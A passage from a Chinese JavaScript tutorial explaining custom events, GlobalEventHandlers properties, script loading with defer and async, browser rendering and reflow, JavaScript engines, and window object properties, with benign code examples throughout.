   -  ``detail`` ：表示事件的附带数据，默认为 ``null`` 。

   下面是一个例子。

   .. code:: javascript

      var event = new CustomEvent('build', { 'detail': 'hello' });
   
      function eventHandler(e) {
        console.log(e.detail);
      }
   
      document.body.addEventListener('build', function (e) {
        console.log(e.detail);
      });
   
      document.body.dispatchEvent(event);

   上面代码中，我们手动定义了 ``build`` 事件。该事件触发后，会被监听到，从而输出该事件实例的 ``detail`` 属性（即字符串 ``hello`` ）。

   下面是另一个例子。

   .. code:: javascript

      var myEvent = new CustomEvent('myevent', {
        detail: {
          foo: 'bar'
        },
        bubbles: true,
        cancelable: false
      });
   
      el.addEventListener('myevent', function (event) {
        console.log('Hello ' + event.detail.foo);
      });
   
      el.dispatchEvent(myEvent);

   上面代码也说明，CustomEvent 的事件实例，除了具有 Event 接口的实例属性，还具有 ``detail`` 属性。

/🟠 GlobalEventHandlers 接口
============================

   指定事件的回调函数，推荐使用的方法是元素的 ``addEventListener`` 方法。

   .. code:: javascript

      div.addEventListener('click', clickHandler, false);

   除了之外，还有一种方法可以直接指定事件的回调函数。

   .. code:: javascript

      div.onclick = clickHandler;

   这个接口是由 ``GlobalEventHandlers`` 接口提供的。它的优点是使用比较方便，缺点是只能为每个事件指定一个回调函数，并且无法指定事件触发的阶段（捕获阶段还是冒泡阶段）。

    ``HTMLElement`` 、 ``Document`` 和 ``Window`` 都继承了这个接口，也就是说，各种 HTML 元素、 ``document`` 对象、 ``window`` 对象上面都可以使用 ``GlobalEventHandlers`` 接口提供的属性。下面就列出这个接口提供的主要的事件属性。

GlobalEventHandlers.onabort
----------------------------

   某个对象的 ``abort`` 事件（停止加载）发生时，就会调用 ``onabort`` 属性指定的回调函数。

   各种元素的停止加载事件，到底如何触发，目前并没有统一的规定。因此实际上，这个属性现在一般只用在 ``<img>`` 元素上面。

   .. code:: javascript

      // HTML 代码如下
      // <img src="example.jpg" id="img">
      var img = document.getElementById('img');
      img.onabort = function () {
        console.log('image load aborted.');
      }

GlobalEventHandlers.onerror
----------------------------

    ``error`` 事件发生时，就会调用 ``onerror`` 属性指定的回调函数。

    ``error`` 事件分成两种。

   一种是 JavaScript 的运行时错误，这会传到 ``window`` 对象，导致 ``window.onerror()`` 。

   .. code:: javascript

      window.onerror = function (message, source, lineno, colno, error) {
        // ...
      }

    ``window.onerror`` 的处理函数共接受五个参数，含义如下。

   - message：错误信息字符串
   - source：报错脚本的 URL
   - lineno：报错的行号，是一个整数
   - colno：报错的列号，是一个整数
   - error： 错误对象

   另一种是资源加载错误，比如 ``<img>`` 或 ``<script>`` 加载的资源出现加载错误。这时，Error 对象会传到对应的元素，导致该元素的 ``onerror`` 属性开始执行。

   .. code:: javascript

      element.onerror = function (event) {
        // ...
      }

   注意，一般来说，资源的加载错误不会触发 ``window.onerror`` 。

GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart
-----------------------------------------------------------

   元素完成加载时，会触发 ``load`` 事件，执行 ``onload()`` 。它的典型使用场景是 ``window`` 对象和 ``<img>`` 元素。对于 ``window`` 对象来说，只有页面的所有资源加载完成（包括图片、脚本、样式表、字体等所有外部资源），才会触发 ``load`` 事件。

   对于 ``<img>`` 和 ``<video>`` 等元素，加载开始时还会触发 ``loadstart`` 事件，导致执行 ``onloadstart`` 。

GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur
-------------------------------------------------------

   当前元素获得焦点时，会触发 ``element.onfocus`` ；失去焦点时，会触发 ``element.onblur`` 。

   .. code:: javascript

      element.onfocus = function () {
        console.log("onfocus event detected!");
      };
      element.onblur = function () {
        console.log("onblur event detected!");
      };

   注意，如果不是可以接受用户输入的元素，要触发 ``onfocus`` ，该元素必须有 ``tabindex`` 属性。

GlobalEventHandlers.onscroll
-----------------------------

   页面或元素滚动时，会触发 ``scroll`` 事件，导致执行 ``onscroll()`` 。

GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow
--------------------------------------------------------------

   用户在页面上按下鼠标的右键，会触发 ``contextmenu`` 事件，导致执行 ``oncontextmenu()`` 。如果该属性执行后返回 ``false`` ，就等于禁止了右键菜单。 ``document.oncontextmenu`` 与 ``window.oncontextmenu`` 效果一样。

   .. code:: javascript

      document.oncontextmenu = function () {
        return false;
      };

   上面代码中， ``oncontextmenu`` 属性执行后返回 ``false`` ，右键菜单就不会出现。

   元素的右键菜单显示时，会触发该元素的 ``onshow`` 监听函数。

其他的事件属性
------------

   鼠标的事件属性。

   - onclick
   - ondblclick
   - onmousedown
   - onmouseenter
   - onmouseleave
   - onmousemove
   - onmouseout
   - onmouseover
   - onmouseup
   - onwheel

   键盘的事件属性。

   - onkeydown
   - onkeypress
   - onkeyup

   焦点的事件属性。

   - onblur
   - onfocus

   表单的事件属性。

   - oninput
   - onchange
   - onsubmit
   - onreset
   - oninvalid
   - onselect

   触摸的事件属性。

   - ontouchcancel
   - ontouchend
   - ontouchmove
   - ontouchstart

   拖动的事件属性分成两类：一类与被拖动元素相关，另一类与接收被拖动元素的容器元素相关。

   被拖动元素的事件属性。

   - ondragstart：拖动开始
   - ondrag：拖动过程中，每隔几百毫秒触发一次
   - ondragend：拖动结束

   接收被拖动元素的容器元素的事件属性。

   - ondragenter：被拖动元素进入容器元素。
   - ondragleave：被拖动元素离开容器元素。
   - ondragover：被拖动元素在容器元素上方，每隔几百毫秒触发一次。
   - ondrop：松开鼠标后，被拖动元素放入容器元素。

    ``<dialog>`` 对话框元素的事件属性。

   - oncancel
   - onclose


/🟡10. 浏览器模型
================================================================================

/🟠 浏览器环境概述
================

   JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。

   本章开始介绍浏览器提供的各种 JavaScript 接口。首先，介绍 JavaScript 代码嵌入网页的方法。

代码嵌入网页的方法
---------------

   网页中嵌入 JavaScript 代码，主要有四种方法。

   -  ``<script>`` 元素直接嵌入代码。
   -  ``<script>`` 标签加载外部脚本
   - 事件属性
   - URL 协议

script 元素嵌入代码
~~~~~~~~~~~~~~~~~

    ``<script>`` 元素内部可以直接写入 JavaScript 代码。

   .. code:: html

      <script>
        var x = 1 + 5;
        console.log(x);
      </script>

    ``<script>`` 标签有一个 ``type`` 属性，用来指定脚本类型。对 JavaScript 脚本来说， ``type`` 属性可以设为两种值。

   -  ``text/javascript`` ：这是默认值，也是历史上一贯设定的值。如果你省略 ``type`` 属性，默认就是这个值。对于老式浏览器，设为这个值比较好。
   -  ``application/javascript`` ：对于较新的浏览器，建议设为这个值。

   .. code:: html

      <script type="application/javascript">
        console.log('Hello World');
      </script>

   由于 ``<script>`` 标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时， ``type`` 属性可以省略。

   如果 ``type`` 属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在 ``<script>`` 标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的 ``type`` 属性即可。

   .. code:: html

      <script id="mydata" type="x-custom-data">
        console.log('Hello World');
      </script>

   上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的 ``type`` 属性。但是，这个 ``<script>`` 节点依然存在于 DOM 之中，可以使用 ``<script>`` 节点的 ``text`` 属性读出它的内容。

   .. code:: javascript

      document.getElementById('mydata').text
      //   console.log('Hello World');

script 元素加载外部脚本
~~~~~~~~~~~~~~~~~~~~

    ``<script>`` 标签也可以指定加载外部的脚本文件。

   .. code:: html

      <script src="https://www.example.com/script.js"></script>

   如果脚本文件使用了非英语字符，还应该注明字符的编码。

   .. code:: html

      <script charset="utf-8" src="https://www.example.com/script.js"></script>

   所加载的脚本必须是纯的 JavaScript 代码，不能有 ``HTML`` 代码和 ``<script>`` 标签。

   加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的 ``console.log`` 语句直接被忽略。

   .. code:: html

      <script charset="utf-8" src="example.js">
        console.log('Hello World!');
      </script>

   为了防止攻击者篡改外部脚本， ``script`` 标签允许设置一个 ``integrity`` 属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。

   .. code:: html

      <script src="/assets/application.js"
        integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=">
      </script>

   上面代码中， ``script`` 标签有一个 ``integrity`` 属性，指定了外部脚本 ``/assets/application.js`` 的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。

事件属性
~~~~~~~

   网页元素的事件属性（比如 ``onclick`` 和 ``onmouseover`` ），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。

   .. code:: html

      <button id="myBtn" onclick="console.log(this.id)">点击</button>

   上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。

URL 协议
~~~~~~~

   URL 支持 ``javascript:`` 协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。

   .. code:: html

      <a href="javascript:console.log('Hello')">点击</a>

   浏览器的地址栏也可以执行 ``javascript:`` 协议。将 ``javascript:console.log('Hello')`` 放入地址栏，按回车键也会执行这段代码。

   如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。

   .. code:: html

      <a href="javascript: new Date().toLocaleTimeString();">点击</a>

   上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。

   如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。

   .. code:: javascript

      <a href="javascript: console.log(new Date().toLocaleTimeString())">点击</a>

   上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。

    ``javascript:`` 协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以 ``javascript:`` 网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上 ``void`` ，或者在脚本最后加上 ``void 0`` 。

   .. code:: html

      <a href="javascript: void new Date().toLocaleTimeString();">点击</a>
      <a href="javascript: new Date().toLocaleTimeString();void 0;">点击</a>

   上面这两种写法，点击链接后，执行代码都不会网页跳转。

script 元素
----------


工作原理
~~~~~~~

   浏览器加载 JavaScript 脚本，主要通过 ``<script>`` 元素完成。正常的网页加载流程是这样的。

   1. 浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。
   2. 解析过程中，浏览器发现 ``<script>`` 元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。
   3. 如果 ``<script>`` 元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。
   4. JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。

   加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。

   如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。

   为了避免这种情况，较好的做法是将 ``<script>`` 标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。

   脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。

   .. code:: html

      <head>
        <script>
          console.log(document.body.innerHTML);
        </script>
      </head>
      <body>
      </body>

   上面代码执行时会报错，因为此时 ``document.body`` 元素还未生成。

   一种解决方法是设定 ``DOMContentLoaded`` 事件的回调函数。

   .. code:: html

      <head>
        <script>
          document.addEventListener(
            'DOMContentLoaded',
            function (event) {
              console.log(document.body.innerHTML);
            }
          );
        </script>
      </head>

   上面代码中，指定 ``DOMContentLoaded`` 事件发生后，才开始执行相关代码。 ``DOMContentLoaded`` 事件只有在 DOM 结构生成之后才会触发。

   另一种解决方法是，使用 ``<script>`` 标签的 ``onload`` 属性。当 ``<script>`` 标签指定的外部脚本文件下载和解析完成，会触发一个 ``load`` 事件，可以把所需执行的代码，放在这个事件的回调函数里面。

   .. code:: html

      <script src="jquery.min.js" onload="console.log(document.body.innerHTML)">
      </script>

   但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。

   .. code:: html

      <body>
        <!-- 其他代码  -->
        <script>
          console.log(document.body.innerHTML);
        </script>
      </body>

   如果有多个 ``script`` 标签，比如下面这样。

   .. code:: html

      <script src="a.js"></script>
      <script src="b.js"></script>

   浏览器会同时并行下载 ``a.js`` 和 ``b.js`` ，但是，执行时会保证先执行 ``a.js`` ，然后再执行 ``b.js`` ，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。

   解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。

   此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。

defer 属性
~~~~~~~~~~

   为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对 ``<script>`` 元素加入 ``defer`` 属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。

   .. code:: html

      <script src="a.js" defer></script>
      <script src="b.js" defer></script>

   上面代码中，只有等到 DOM 加载完成后，才会执行 ``a.js`` 和 ``b.js`` 。

    ``defer`` 属性的运行流程如下。

   1. 浏览器开始解析 HTML 网页。
   2. 解析过程中，发现带有 ``defer`` 属性的 ``<script>`` 元素。
   3. 浏览器继续往下解析 HTML 网页，同时并行下载 ``<script>`` 元素加载的外部脚本。
   4. 浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。

   有了 ``defer`` 属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在 ``DOMContentLoaded`` 事件触发前执行（即刚刚读取完 ``</html>`` 标签），而且可以保证执行顺序就是它们在页面上出现的顺序。

   对于内置而不是加载外部脚本的 ``script`` 标签，以及动态生成的 ``script`` 标签， ``defer`` 属性不起作用。另外，使用 ``defer`` 加载的外部脚本不应该使用 ``document.write`` 方法。

async 属性
~~~~~~~~~~

   解决“阻塞效应”的另一个方法是对 ``<script>`` 元素加入 ``async`` 属性。

   .. code:: html

      <script src="a.js" async></script>
      <script src="b.js" async></script>

    ``async`` 属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。

   1. 浏览器开始解析 HTML 网页。
   2. 解析过程中，发现带有 ``async`` 属性的 ``script`` 标签。
   3. 浏览器继续往下解析 HTML 网页，同时并行下载 ``<script>`` 标签中的外部脚本。
   4. 脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。
   5. 脚本执行完毕，浏览器恢复解析 HTML 网页。

    ``async`` 属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用 ``async`` 属性的脚本文件里面的代码，不应该使用 ``document.write`` 方法。

    ``defer`` 属性和 ``async`` 属性到底应该使用哪一个？

   一般来说，如果脚本之间没有依赖关系，就使用 ``async`` 属性，如果脚本之间有依赖关系，就使用 ``defer`` 属性。如果同时使用 ``async`` 和 ``defer`` 属性，后者不起作用，浏览器行为由 ``async`` 属性决定。

脚本的动态加载
~~~~~~~~~~~~

    ``<script>`` 元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。

   .. code:: javascript

      ['a.js', 'b.js'].forEach(function(src) {
        var script = document.createElement('script');
        script.src = src;
        document.head.appendChild(script);
      });

   这种方法的好处是，动态生成的 ``script`` 标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。

   如果想避免这个问题，可以设置async属性为 ``false`` 。

   .. code:: javascript

      ['a.js', 'b.js'].forEach(function(src) {
        var script = document.createElement('script');
        script.src = src;
        script.async = false;
        document.head.appendChild(script);
      });

   上面的代码不会阻塞页面渲染，而且可以保证 ``b.js`` 在 ``a.js`` 后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待 ``b.js`` 执行完成后再执行。

   如果想为动态加载的脚本指定回调函数，可以使用下面的写法。

   .. code:: javascript

      function loadScript(src, done) {
        var js = document.createElement('script');
        js.src = src;
        js.onload = function() {
          done();
        };
        js.onerror = function() {
          done(new Error('Failed to load script ' + src));
        };
        document.head.appendChild(js);
      }

加载使用的协议
~~~~~~~~~~~~

   如果不指定协议，浏览器默认采用 HTTP 协议下载。

   .. code:: html

      <script src="example.js"></script>

   上面的 ``example.js`` 默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。

   .. code:: html

      <script src="https://example.js"></script>

   但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。

   .. code:: html

      <script src="//example.js"></script>

浏览器的组成
----------

   浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。

渲染引擎
~~~~~~~

   渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。

   不同的浏览器有不同的渲染引擎。

   - Firefox：Gecko 引擎
   - Safari：WebKit 引擎
   - Chrome：Blink 引擎
   - IE: Trident 引擎
   - Edge: EdgeHTML 引擎

   渲染引擎处理网页，通常分成四个阶段。

   1. 解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。
   2. 对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。
   3. 布局：计算出渲染树的布局（layout）。
   4. 绘制：将渲染树绘制到屏幕。

   以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。

重流和重绘
~~~~~~~~

   渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。

   页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（ ``a:hover`` ）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。

   重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。

   大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。

   作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘 ``table`` 布局和 ``flex`` 布局，开销都会比较大。

   .. code:: javascript

      var foo = document.getElementById('foobar');
   
      foo.style.color = 'blue';
      foo.style.marginTop = '30px';

   上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。

   下面是一些优化技巧。

   - 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。
   - 缓存 DOM 信息。
   - 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。
   - 使用 ``documentFragment`` 操作 DOM
   - 动画使用 ``absolute`` 定位或 ``fixed`` 定位，这样可以减少对其他元素的影响。
   - 只在必要时才显示隐藏元素。
   - 使用 ``window.requestAnimationFrame()`` ，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。
   - 使用虚拟 DOM（virtual DOM）库。

   下面是一个 ``window.requestAnimationFrame()`` 对比效果的例子。

   .. code:: javascript

      // 重流代价高
      function doubleHeight(element) {
        var currentHeight = element.clientHeight;
        element.style.height = (currentHeight * 2) + 'px';
      }
   
      all_my_elements.forEach(doubleHeight);
   
      // 重绘代价低
      function doubleHeight(element) {
        var currentHeight = element.clientHeight;
   
        window.requestAnimationFrame(function () {
          element.style.height = (currentHeight * 2) + 'px';
        });
      }
   
      all_my_elements.forEach(doubleHeight);

   上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。

JavaScript 引擎
~~~~~~~~~~~~~~

   JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。

   JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。

   为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。

   早期，浏览器内部对 JavaScript 的处理过程如下：

   1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
   2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
   3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
   4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。

   逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。

   字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：

   - [Chakra](https://en.wikipedia.org/wiki/Chakra_(JScript_engine)) (Microsoft Internet Explorer)
   - [Nitro/JavaScript Core](http://en.wikipedia.org/wiki/WebKit#JavaScriptCore) (Safari)
   - [Carakan](http://dev.opera.com/articles/view/labs-carakan/) (Opera)
   - [SpiderMonkey](https://developer.mozilla.org/en-US/docs/SpiderMonkey) (Firefox)
   - [V8](https://en.wikipedia.org/wiki/Chrome_V8) (Chrome, Chromium)

参考链接
-------

   - John Dalziel, [The race for speed part 2: How JavaScript compilers work](http://creativejs.com/2013/06/the-race-for-speed-part-2-how-javascript-compilers-work/)
   - Jake Archibald, [Deep dive into the murky waters of script loading](http://www.html5rocks.com/en/tutorials/speed/script-loading/)
   - Mozilla Developer Network, [window.setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/window.setTimeout)
   - Remy Sharp, [Throttling function calls](http://remysharp.com/2010/07/21/throttling-function-calls/)
   - Ayman Farhat, [An alternative to JavaScript's evil setInterval](http://www.thecodeship.com/web-development/alternative-to-javascript-evil-setinterval/)
   - Ilya Grigorik, [Script-injected "async scripts" considered harmful](https://www.igvita.com/2014/05/20/script-injected-async-scripts-considered-harmful/)
   - Axel Rauschmayer, [ECMAScript 6 promises (1/2): foundations](http://www.2ality.com/2014/09/es6-promises-foundations.html)
   - Daniel Imms, [async vs defer attributes](http://www.growingwiththeweb.com/2014/02/async-vs-defer-attributes.html)
   - Craig Buckler, [Load Non-blocking JavaScript with HTML5 Async and Defer](http://www.sitepoint.com/non-blocking-async-defer/)
   - Domenico De Felice, [How browsers work](https://domenicodefelice.blogspot.com/2015/08/how-browsers-work.html)

/🟠 window 对象
===============

概述
---

   浏览器里面， ``window`` 对象（注意， ``w`` 为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。

   .. code:: javascript

      a = 1;
      window.a // 1

   上面代码中， ``a`` 是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。

    ``window`` 有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把 ``window`` 对象当作顶层对象，所有未声明就赋值的变量都自动变成 ``window`` 对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。

window 对象的属性
---------------


window.name
~~~~~~~~~~~~

    ``window.name`` 属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的 ``target`` 属性使用。

   .. code:: javascript

      window.name = 'Hello World!';
      console.log(window.name)
      // "Hello World!"

   该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。

   只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问 ``a.com`` 时，该页面的脚本设置了 ``window.name`` ，接下来在同一个窗口里面载入了 ``b.com`` ，新页面的脚本可以读到上一个网页设置的 ``window.name`` 。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。

window.closed，window.opener
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.closed`` 属性返回一个布尔值，表示窗口是否关闭。

   .. code:: javascript

      window.closed // false

   上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。

   .. code:: javascript

      var popup = window.open();
   
      if ((popup !== null) && !popup.closed) {
        // 窗口仍然打开着
      }

    ``window.opener`` 属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回 ``null`` 。

   .. code:: javascript

      window.open().opener === window // true

   上面表达式会打开一个新窗口，然后返回 ``true`` 。

   如果两个窗口之间不需要通信，建议将子窗口的 ``opener`` 属性显式设为 ``null`` ，这样可以减少一些安全隐患。

   .. code:: javascript

      var newWin = window.open('example.html', 'newWindow', 'height=400,width=400');
      newWin.opener = null;

   上面代码中，子窗口的 ``opener`` 属性设为 ``null`` ，两个窗口之间就没办法再联系了。

   通过 ``opener`` 属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。 ``<a>`` 元素添加 ``rel="noopener"`` 属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。

   .. code:: html

      <a href="https://an.evil.site" target="_blank" rel="noopener">
      恶意网站
      </a>

window.self，window.window
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.self`` 和 ``window.window`` 属性都指向窗口本身。这两个属性只读。

   .. code:: javascript

      window.self === window // true
      window.window === window // true

window.frames，window.length
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.frames`` 属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括 ``frame`` 元素和 ``iframe`` 元素。 ``window.frames[0]`` 表示页面中第一个框架窗口。

   如果 ``iframe`` 元素设置了 ``id`` 或 ``name`` 属性，那么就可以用属性值，引用这个 ``iframe`` 窗口。比如 ``<iframe name="myIFrame">`` 可以用 ``frames['myIFrame']`` 或者 ``frames.myIFrame`` 来引用。

    ``frames`` 属性实际上是 ``window`` 对象的别名。

   .. code:: javascript

      frames === window // true

   因此， ``frames[0]`` 也可以用 ``window[0]`` 表示。但是，从语义上看， ``frames`` 更清晰，而且考虑到 ``window`` 还是全局对象，因此推荐表示多窗口时，总是使用 ``frames[0]`` 的写法。更多介绍请看下文的《多窗口操作》部分。

    ``window.length`` 属性返回当前网页包含的框架总数。如果当前网页不包含 ``frame`` 和 ``iframe`` 元素，那么 ``window.length`` 就返回 ``0`` 。

   .. code:: javascript

      window.frames.length === window.length // true

   上面代码表示， ``window.frames.length`` 与 ``window.length`` 应该是相等的。

window.frameElement
~~~~~~~~~~~~~~~~~~~~

    ``window.frameElement`` 属性主要用于当前窗口嵌在另一个网页的情况（嵌入 ``<object>`` 、 ``<iframe>`` 或 ``<embed>`` 元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <iframe src="about.html"></iframe>
   
      // 下面的脚本在 about.html 里面
      var frameEl = window.frameElement;
      if (frameEl) {
        frameEl.src = 'other.html';
      }

   上面代码中， ``frameEl`` 变量就是 ``<iframe>`` 元素。

window.top，window.parent
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.top`` 属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。

    ``window.parent`` 属性指向父窗口。如果当前窗口没有父窗口， ``window.parent`` 指向自身。

   .. code:: javascript

      if (window.parent !== window.top) {
        // 表明当前窗口嵌入不止一层
      }

   对于不包含框架的网页，这两个属性等同于 ``window`` 对象。

window.status
~~~~~~~~~~~~~~

    ``window.status`` 属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。

window.devicePixelRatio
~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.devicePixelRatio`` 属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。

位置大小属性
